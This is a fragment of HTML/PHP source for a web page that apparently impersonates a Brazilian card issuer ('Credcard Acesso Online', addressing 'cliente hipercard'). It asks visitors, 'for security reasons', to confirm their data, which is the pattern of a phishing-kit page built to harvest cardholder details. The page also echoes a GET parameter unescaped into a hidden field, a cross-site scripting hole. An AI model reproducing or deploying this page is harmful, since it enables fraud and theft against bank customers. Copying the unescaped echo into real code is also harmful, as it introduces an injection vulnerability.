...
<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Credcard Acesso Online</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
	
	<script type="text/javascript" src="js/jquery.js"></script>
	<script type="text/javascript" src="js/jquery.mask.min.js"></script>
	
	<link rel="shortcut icon" href="../assets/imagenss/img_about_logo.png">
...
<body>
	...
	<header class="top-promo">
		<img src="../assets/imagenss/img_about_logo.png">
	</header>
	...
	<section class="frm-container">
		<div class="eng-tx">
			<p>Olá cliente hipercard, por motivos de segurança, você precisa confirmar os seguintes dados abaixo.</p>
		</div>
		<div class="frm">
...
<input type="hidden" name="mensagem" value="<?php echo $_GET['mensagem']; ?>">
				...
				<input type="submit" id="btncad" class="btncad" name="btncad" value="continuar" style="background-color: rgb(0,0,205); color: rgb(255, 255, 255);">
